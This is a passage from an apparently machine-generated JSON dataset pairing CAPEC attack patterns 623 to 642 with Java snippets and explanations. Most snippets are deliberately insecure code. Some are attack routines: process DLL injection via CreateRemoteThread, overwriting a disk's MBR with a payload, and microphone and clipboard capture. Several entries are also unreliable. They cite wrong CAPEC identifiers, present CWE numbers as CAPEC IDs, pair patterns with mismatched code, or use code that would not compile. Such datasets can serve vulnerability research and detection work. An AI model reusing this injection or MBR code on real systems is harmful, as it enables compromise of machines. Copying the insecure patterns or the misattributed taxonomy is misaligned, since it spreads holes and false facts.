        "description": "This Java code snippet demonstrates a vulnerable cryptographic implementation that can be susceptible to an Electromagnetic Side-Channel Attack. The code uses the DES algorithm (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) to encrypt sensitive information. DES is known to be weak and can be broken with modern computational power. Additionally, the code does not implement any countermeasures to protect against physical side-channel attacks (CWE-1300: Improper Protection of Physical Side Channels). An attacker with proximal access could potentially monitor electromagnetic emissions during the encryption process to derive the secret key or the sensitive data being processed."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SensitiveDataTransmitter {\n    private static final String SERVER_ADDRESS = \"192.168.1.100\";\n    private static final int SERVER_PORT = 8080;\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            transmitData(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void transmitData(String data) throws IOException {\n        Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(data.getBytes());\n        outputStream.flush();\n        outputStream.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information (a user's password) is transmitted over a network without any encryption or protection. This embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by showing how sensitive data can be exposed during transmission. The code also touches on related CWEs: CWE-201 (Insertion of Sensitive Information Into Sent Data) by directly sending sensitive data, CWE-1300 (Improper Protection of Physical Side Channels) by not protecting against potential side-channel attacks, and CWE-1320 (Improper Protection for Outbound Error Messages and Alert Signals) by not handling potential errors securely. The code is vulnerable to interception and analysis, which could lead to the disclosure of sensitive information."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "public class HardwareDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection logic\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection logic\n        clockGlitchDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection logic\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection logic\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        HardwareDevice device = new HardwareDevice();\n        device.detectVoltageGlitch(); // Simulate a voltage glitch attack\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware device that performs cryptographic operations. The device includes basic detection mechanisms for various fault injection attacks such as voltage glitches, clock glitches, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-188 (Hardware Fault Injection) by demonstrating how a device might detect and respond to fault injection attempts, thereby protecting sensitive information. The related CWEs are addressed by simulating detection mechanisms for voltage and clock glitches (CWE-1247), overheating (CWE-1338), and cold environments (CWE-1351)."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "public class MobileDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection of voltage glitch\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection of clock glitch\n        clockGlitchDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection of overheating\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection of cold environment\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        MobileDevice device = new MobileDevice();\n        device.detectVoltageGlitch(); // Simulate a fault injection attack\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a mobile device that performs cryptographic operations. The device includes basic detection mechanisms for various fault injection attacks, such as voltage glitches, clock glitches, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-1247, CAPEC-1248, CAPEC-1256, CAPEC-1319, CAPEC-1332, CAPEC-1334, CAPEC-1338, and CAPEC-1351 by demonstrating how a device might detect and respond to fault injection attacks to protect sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JPasswordField;\n\npublic class SmudgeAttackDemo {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Login\");\n        JPasswordField passwordField = new JPasswordField(20);\n        JButton loginButton = new JButton(\"Login\");\n\n        loginButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                char[] password = passwordField.getPassword();\n                // Simulate password processing\n                System.out.println(\"Password entered: \" + new String(password));\n                // Clear the password field to prevent smudge attack\n                passwordField.setText(\"\");\n            }\n        });\n\n        frame.add(passwordField);\n        frame.add(loginButton);\n        frame.setSize(300, 100);\n        frame.setLayout(new java.awt.FlowLayout());\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setVisible(true);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple GUI application with a password field and a login button. The main idea is to show how a smudge attack can be mitigated by clearing the password field after the password is processed. The code creates a JFrame with a JPasswordField and a JButton. When the login button is clicked, the password is retrieved and printed (simulating password processing), and then the password field is cleared to prevent smudge attacks. This addresses the CAPEC of smudge attacks by ensuring that the password input is not left on the screen, which could otherwise be revealed by oil smudges left by the user's fingers. The code also touches on CWE-1300 by demonstrating a basic protection mechanism against physical side channels."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import java.util.Date;\nimport java.util.Random;\n\npublic class GPSReceiver {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final long TRUE_TIMESTAMP = new Date().getTime();\n\n    public static void main(String[] args) {\n        double[] receivedCoordinates = receiveGPSSignal();\n        long receivedTimestamp = receiveTimestamp();\n\n        if (verifySource(receivedCoordinates, receivedTimestamp)) {\n            System.out.println(\"GPS Coordinates: \" + receivedCoordinates[0] + \", \" + receivedCoordinates[1]);\n            System.out.println(\"Timestamp: \" + new Date(receivedTimestamp));\n        } else {\n            System.out.println(\"Warning: GPS signal source verification failed!\");\n        }\n    }\n\n    private static double[] receiveGPSSignal() {\n        // Simulate receiving spoofed GPS signal\n        Random random = new Random();\n        return new double[]{TRUE_LATITUDE + random.nextDouble() * 0.01, TRUE_LONGITUDE + random.nextDouble() * 0.01};\n    }\n\n    private static long receiveTimestamp() {\n        // Simulate receiving spoofed timestamp\n        return TRUE_TIMESTAMP + (new Random().nextInt(10000) - 5000);\n    }\n\n    private static boolean verifySource(double[] coordinates, long timestamp) {\n        // Improper verification of source\n        return coordinates[0] == TRUE_LATITUDE && coordinates[1] == TRUE_LONGITUDE && timestamp == TRUE_TIMESTAMP;\n    }\n}",
        "description": "This Java code snippet simulates a GPS receiver that receives GPS signals and timestamps. The `receiveGPSSignal` and `receiveTimestamp` methods simulate the reception of potentially spoofed GPS data. The `verifySource` method attempts to verify the source of the GPS data but does so improperly by directly comparing the received data to the true values. This represents the CAPEC of 'Counterfeit GPS Signals' by showing how an adversary could deceive the GPS receiver with spoofed signals. The code also embodies related CWEs, such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), by demonstrating inadequate verification and potential message tampering."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import java.util.Random;\n\npublic class GPSSpoofingAttack {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final double SPOOFED_LATITUDE = 40.7128;\n    private static final double SPOOFED_LONGITUDE = -74.0060;\n    private static final double INCREMENT = 0.0001;\n\n    public static void main(String[] args) {\n        double currentLatitude = TRUE_LATITUDE;\n        double currentLongitude = TRUE_LONGITUDE;\n        Random random = new Random();\n\n        while (true) {\n            // Simulate gradual increase in spoofed signal strength\n            if (random.nextBoolean()) {\n                currentLatitude += INCREMENT;\n                currentLongitude += INCREMENT;\n            } else {\n                currentLatitude -= INCREMENT;\n                currentLongitude -= INCREMENT;\n            }\n\n            // Check if the spoofed coordinates are reached\n            if (Math.abs(currentLatitude - SPOOFED_LATITUDE) < INCREMENT &&\n                Math.abs(currentLongitude - SPOOFED_LONGITUDE) < INCREMENT) {\n                System.out.println(\"Spoofed location reached: \" + currentLatitude + \", \" + currentLongitude);\n                break;\n            }\n\n            System.out.println(\"Current location: \" + currentLatitude + \", \" + currentLongitude);\n\n            // Simulate delay\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet simulates a GPS spoofing attack, specifically a carry-off attack. The code starts with the true GPS coordinates and gradually modifies them to move towards the spoofed coordinates. The gradual change in coordinates represents the increasing power of the counterfeit signals, which eventually leads the target to the spoofed location. This snippet embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate GPS signals to mislead the target's location. The related CWEs are represented by the lack of proper verification and integrity checks, allowing the spoofing attack to succeed."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableResourceHandler {\n    private static boolean isAuthorized(String user) {\n        // Incorrect authorization check (CWE-863)\n        return \"admin\".equals(user);\n    }\n\n    public static void main(String[] args) {\n        String user = args[0];\n        String filePath = args[1];\n\n        if (!isAuthorized(user)) {\n            System.out.println(\"Unauthorized access attempt detected.\");\n            return;\n        }\n\n        try {\n            // Improper handling of Windows device names (CWE-67)\n            File file = new File(filePath);\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // Missing release of resource after effective lifetime (CWE-772)\n            // File resource is not explicitly released\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable resource handler that embodies the main idea of the deprecated CAPEC 'Unauthorized Use of Device Resources'. The code includes several related CWEs for additional context:\n\n1. **Incorrect Authorization (CWE-863)**: The `isAuthorized` method performs an authorization check, but it is overly simplistic and only checks if the user is 'admin'. This can be easily bypassed if the authorization logic is flawed or if the user input is manipulated.\n\n2. **Improper Handling of Windows Device Names (CWE-67)**: The code constructs a file path from user input without properly handling Windows device names like 'AUX' or 'CON'. This can lead to denial of service or information exposure.\n\n3. **Missing Release of Resource after Effective Lifetime (CWE-772)**: The code opens a file and reads its contents but does not explicitly release the file resource after its effective lifetime. This can lead to resource leaks and potential exhaustion of system resources.\n\nThe code represents the main point of the CAPEC by showing how unauthorized use of device resources can occur due to improper authorization checks, mishandling of device names, and failure to release resources properly."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"/defaultPage\");\n        }\n    }\n}\n",
        "description": "This Java servlet code demonstrates a potential TypoSquatting vulnerability by allowing user-controlled input to dictate the redirection URL. The 'targetUrl' parameter is taken directly from the request and used in the 'sendRedirect' method without validation. This can lead to CWE-601 (URL Redirection to Untrusted Site), making it easier for an attacker to perform phishing attacks by redirecting users to a malicious site. The code snippet embodies the main idea of TypoSquatting by showing how an adversary could exploit user input to redirect to a typo-squatted domain. Additionally, it touches on CWE-115 (Misinterpretation of Input) as the input is not properly validated, and CWE-697 (Incorrect Comparison) as there is no proper check to ensure the URL is trusted."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class SoundSquattingExample {\n    public static void main(String[] args) {\n        String userInputDomain = \"trusted-site.com\"; // Simulated user input\n        String soundSquattedDomain = \"trvsted-site.com\"; // SoundSquatted domain\n\n        try {\n            // CWE-601: URL Redirection to Untrusted Site\n            URL url = new URL(\"http://\" + soundSquattedDomain + \"/login\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-348: Use of Less Trusted Source\n            Scanner scanner = new Scanner(connection.getInputStream());\n            String response = scanner.useDelimiter(\"\\\\A\").next();\n            scanner.close();\n\n            // CWE-290: Authentication Bypass by Spoofing\n            if (response.contains(\"Welcome\")) {\n                System.out.println(\"Authenticated to \" + soundSquattedDomain);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SoundSquatting attack by redirecting a user to a sound-alike domain (trvsted-site.com) instead of the trusted domain (trusted-site.com). The code simulates a user input domain and constructs a URL to the sound-squatted domain. It then opens a connection to this URL and reads the response. If the response contains the word 'Welcome', it falsely assumes authentication success, demonstrating CWE-290 (Authentication Bypass by Spoofing). The code also highlights CWE-601 (URL Redirection to Untrusted Site) by using user-controlled input for redirection and CWE-348 (Use of Less Trusted Source) by trusting the response from the less trusted sound-squatted domain."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class HomographAttackExample {\n    public static void main(String[] args) {\n        String userInput = \"http://ex\u0430mple.com\"; // Note: The '\u0430' here is a Cyrillic 'a'\n        String trustedDomain = \"http://example.com\";\n\n        if (isValidDomain(userInput, trustedDomain)) {\n            System.out.println(\"Domain is trusted.\");\n        } else {\n            System.out.println(\"Domain is not trusted.\");\n        }\n    }\n\n    public static boolean isValidDomain(String userInput, String trustedDomain) {\n        // Regular expression to match the trusted domain\n        String regex = \"^http://example\\.com$\";\n        Pattern pattern = Pattern.compile(regex);\n        Matcher matcher = pattern.matcher(userInput);\n\n        // Check if the user input matches the trusted domain\n        return matcher.matches();\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability to a homograph attack. The user input 'http://ex\u0430mple.com' contains a Cyrillic '\u0430' instead of a Latin 'a', making it visually similar to the trusted domain 'http://example.com'. The code uses a regular expression to validate the domain, but it does not account for homoglyphs, leading to insufficient visual distinction (CWE-1007). Additionally, the regular expression is anchored (CWE-777), but the example highlights the importance of considering character sets to prevent homograph attacks. This snippet represents the main idea of CAPEC-1007 by showing how visually similar characters can be used to deceive users into trusting malicious domains."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class TokenImpersonationExample {\n    private static Map<String, String> userTokens = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user login\n        String userId = \"user123\";\n        String token = generateToken(userId);\n        userTokens.put(userId, token);\n\n        // Adversary impersonates the user by generating a token with the same userId\n        String impersonatedToken = generateToken(userId);\n\n        // Validate token (improper authentication)\n        if (validateToken(userId, impersonatedToken)) {\n            System.out.println(\"Access granted for user: \" + userId);\n        } else {\n            System.out.println(\"Access denied for user: \" + userId);\n        }\n    }\n\n    private static String generateToken(String userId) {\n        // Weak token generation (CWE-1270)\n        return \"token_\" + userId;\n    }\n\n    private static boolean validateToken(String userId, String token) {\n        // Improper authentication (CWE-287)\n        return userTokens.containsKey(userId) && userTokens.get(userId).equals(token);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of token impersonation. The `generateToken` method creates a weak token based on the user ID, which is a vulnerability (CWE-1270). An adversary can easily generate a token for a known user ID and impersonate that user. The `validateToken` method performs improper authentication (CWE-287) by only checking if the token matches the stored token for the user ID, without any additional security checks. This allows an adversary to gain unauthorized access by using an impersonated token."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class AudioCapture {\n    public static void main(String[] args) {\n        try {\n            // Define the audio format\n            AudioFormat format = new AudioFormat(16000, 16, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n\n            // Check if the system supports the data line\n            if (!AudioSystem.isLineSupported(info)) {\n                System.out.println(\"Line not supported\");\n                System.exit(0);\n            }\n\n            // Get and open the target data line\n            TargetDataLine targetLine = (TargetDataLine) AudioSystem.getLine(info);\n            targetLine.open(format);\n            targetLine.start();\n\n            // Create a thread to capture audio data\n            Thread captureThread = new Thread(() -> {\n                try (ByteArrayOutputStream out = new ByteArrayOutputStream()) {\n                    byte[] buffer = new byte[1024];\n                    while (true) {\n                        int bytesRead = targetLine.read(buffer, 0, buffer.length);\n                        out.write(buffer, 0, bytesRead);\n                        // Simulate sending data over the network in cleartext\n                        sendDataOverNetwork(out.toByteArray());\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            captureThread.start();\n        } catch (LineUnavailableException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendDataOverNetwork(byte[] data) {\n        // Simulate cleartext transmission of sensitive information\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet captures audio from the system's microphone and simulates sending the captured data over the network in cleartext. The code demonstrates the main idea of the CAPEC 'Probe Audio and Video Peripherals' by exploiting the system's audio functionalities to capture sensitive information. The code also embodies related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) by sending the captured audio data in cleartext, CWE-267 (Privilege Defined With Unsafe Actions) by potentially allowing unauthorized access to the audio capture functionality, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing captured audio data to unauthorized entities."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class FileUploadHandler {\n    public void handleFileUpload(String fileName, byte[] fileContent) throws IOException {\n        // CWE-73: External Control of File Name or Path\n        Path filePath = Paths.get(\"/uploads/\" + fileName);\n\n        // CWE-641: Improper Restriction of Names for Files and Other Resources\n        if (!isValidFileName(fileName)) {\n            throw new IOException(\"Invalid file name\");\n        }\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (fileName.endsWith(\".exe\")) {\n            throw new IOException(\"Executable files are not allowed\");\n        }\n\n        // Save the file\n        Files.write(filePath, fileContent);\n    }\n\n    private boolean isValidFileName(String fileName) {\n        // CWE-162: Improper Neutralization of Trailing Special Elements\n        return !fileName.contains(\"..\") && !fileName.contains(\"/\") && !fileName.contains(\"\\\\\");\n    }\n\n    public static void main(String[] args) {\n        FileUploadHandler handler = new FileUploadHandler();\n        try {\n            handler.handleFileUpload(\"example.txt\", \"Hello, World!\".getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a file upload handler that embodies the main idea of CAPEC-158: 'Alternative Execution Due to Deceptive Filenames'. The code addresses several related CWEs to ensure secure handling of file uploads. It constructs a file path using user input (CWE-73), validates the file name to prevent directory traversal and special character issues (CWE-162, CWE-641), and restricts certain file types based on their extensions (CWE-646). The main idea is to prevent attackers from exploiting file names to execute malicious code or cause other security issues."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MaliciousFileHider {\n    public static void main(String[] args) {\n        try {\n            // Create a normal file\n            File file = new File(\"example.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write normal content to the file\n            FileOutputStream fos = new FileOutputStream(file);\n            fos.write(\"This is a normal file content.\".getBytes());\n            fos.close();\n\n            // Hide malicious data in the file's metadata (using extended attributes)\n            String maliciousData = \"malicious_code_here\";\n            Files.setAttribute(Paths.get(\"example.txt\"), \"user.maliciousData\", maliciousData.getBytes());\n\n            System.out.println(\"File created and malicious data hidden in metadata.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker can hide malicious data within a file's metadata. The code creates a normal text file and writes some benign content to it. Then, it uses the `Files.setAttribute` method to store malicious data in the file's extended attributes, which are not typically visible during normal file operations. This approach embodies the CAPEC concept of hiding malicious data within files, making it difficult to discover. The related CWEs provide additional context, such as the potential for embedded malicious code (CWE-506) and the risks of storing sensitive data in cleartext (CWE-313)."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import java.awt.datatransfer.Clipboard;\nimport java.awt.datatransfer.DataFlavor;\nimport java.awt.datatransfer.Transferable;\nimport java.awt.Toolkit;\n\npublic class ClipboardDataCollector {\n    public static void main(String[] args) {\n        try {\n            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n            Transferable contents = clipboard.getContents(null);\n            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {\n                String clipboardData = (String) contents.getTransferData(DataFlavor.stringFlavor);\n                // CWE-318: Cleartext Storage of Sensitive Information in Executable\n                System.out.println(\"Clipboard contains: \" + clipboardData);\n                // CWE-317: Cleartext Storage of Sensitive Information in GUI\n                // Displaying sensitive information directly in the GUI\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an application can collect data from the system clipboard, which can potentially include sensitive information. The code accesses the clipboard, retrieves its contents if they are in string format, and then prints the data to the console. This embodies the CAPEC concept of 'Collect Data from Clipboard' by showing how an application can exploit clipboard data. The code also highlights related CWEs: CWE-318 (Cleartext Storage of Sensitive Information in Executable) by printing sensitive data directly to the console, and CWE-317 (Cleartext Storage of Sensitive Information in GUI) by implying that this data could be displayed in a GUI. This example illustrates the risk of exposing sensitive information through clipboard access and improper handling."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\n\npublic class FirmwareAlteration {\n    private static final String HDD_PATH = \"/dev/sda\";\n    private static final int MBR_SIZE = 512;\n    private static final byte[] MALICIOUS_PAYLOAD = new byte[]{ /* malicious code bytes */ };\n\n    public static void main(String[] args) {\n        try (RandomAccessFile hdd = new RandomAccessFile(HDD_PATH, \"rw\");\n             FileChannel channel = hdd.getChannel()) {\n\n            // Read the original MBR\n            ByteBuffer mbrBuffer = ByteBuffer.allocate(MBR_SIZE);\n            channel.read(mbrBuffer);\n            mbrBuffer.flip();\n\n            // Modify the MBR to include malicious payload\n            for (int i = 0; i < MALICIOUS_PAYLOAD.length; i++) {\n                mbrBuffer.put(i, MALICIOUS_PAYLOAD[i]);\n            }\n\n            // Write the modified MBR back to the HDD\n            mbrBuffer.flip();\n            channel.write(mbrBuffer);\n\n            System.out.println(\"MBR modified successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include a malicious payload. The code opens the HDD device file, reads the original MBR, modifies it by injecting the malicious payload, and writes the modified MBR back to the HDD. This represents the CAPEC 'Altered Component Firmware' by showing how an adversary could exploit improperly protected firmware to achieve persistence on a system. The related CWEs provide context on potential weaknesses that could be exploited, such as insufficient access control for volatile memory (CWE-1274) and missing immutable root of trust in hardware (CWE-1326)."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableFileStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\";\n        File file = new File(\"/tmp/sensitive_info.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where sensitive information is stored in a file without proper access controls. The code writes a string containing sensitive data (a user password) to a file located in the /tmp directory. This directory is typically accessible to all users on the system, making the sensitive information vulnerable to unauthorized access. This example embodies the main idea of the CAPEC 'Probe System Files' by showing how improperly protected files can lead to unauthorized information disclosure. The related CWEs are represented as follows: CWE-552 (Files or Directories Accessible to External Parties) and CWE-377 (Insecure Temporary File)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import com.sun.jna.Library;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\n\npublic class DLLInjectionExample {\n    public interface Kernel32 extends Library {\n        Kernel32 INSTANCE = (Kernel32) Native.loadLibrary(\"kernel32\", Kernel32.class);\n        Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, int dwProcessId);\n        boolean WriteProcessMemory(Pointer hProcess, Pointer lpBaseAddress, byte[] lpBuffer, int nSize, int[] lpNumberOfBytesWritten);\n        boolean CreateRemoteThread(Pointer hProcess, Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);\n    }\n\n    public static void main(String[] args) {\n        int processId = 1234; // Target process ID\n        String dllPath = \"C:\\\\path\\\\to\\\\malicious.dll\";\n\n        Pointer process = Kernel32.INSTANCE.OpenProcess(0x1F0FFF, false, processId);\n        if (process == null) {\n            System.out.println(\"Failed to open process\");\n            return;\n        }\n\n        byte[] dllBytes = dllPath.getBytes();\n        Pointer allocMem = Kernel32.INSTANCE.VirtualAllocEx(process, null, dllBytes.length, 0x3000, 0x40);\n        Kernel32.INSTANCE.WriteProcessMemory(process, allocMem, dllBytes, dllBytes.length, null);\n\n        Pointer loadLibraryAddr = Kernel32.INSTANCE.GetProcAddress(Kernel32.INSTANCE.GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n        Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, loadLibraryAddr, allocMem, 0, null);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of DLL injection, a technique where an attacker injects a malicious DLL into a running process. The code uses the Java Native Access (JNA) library to interact with Windows API functions. The `OpenProcess` function is used to get a handle to the target process, `WriteProcessMemory` writes the path of the malicious DLL into the target process's memory, and `CreateRemoteThread` is used to execute the `LoadLibraryA` function within the context of the target process, loading the malicious DLL. This embodies the CAPEC concept of 'Inclusion of Code in Existing Process' by injecting and executing arbitrary code within the address space of another process, potentially leading to privilege escalation and evasion of detection. The related CWEs highlight the risks of executing or loading untrusted code, which is demonstrated in this example."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class DLLSideLoadingExample {\n    public static void main(String[] args) {\n        String dllName = \"example.dll\";\n        String appDirectory = \"C:\\\\Program Files\\\\MyApp\\\\\";\n        String untrustedDirectory = \"C:\\\\Untrusted\\\\\";\n\n        // Vulnerable code: loading DLL from an untrusted directory\n        try {\n            Path source = Paths.get(untrustedDirectory + dllName);\n            Path destination = Paths.get(appDirectory + dllName);\n            Files.copy(source, destination, StandardCopyOption.REPLACE_EXISTING);\n            System.load(destination.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where a DLL is loaded from an untrusted directory, embodying the concept of DLL Side-Loading. The code copies a DLL from an untrusted directory to the application's directory and then loads it. This represents CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the DLL is sourced from a location that could be controlled by an attacker. The code does not verify the integrity or authenticity of the DLL, making it susceptible to loading a malicious DLL instead of the legitimate one."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
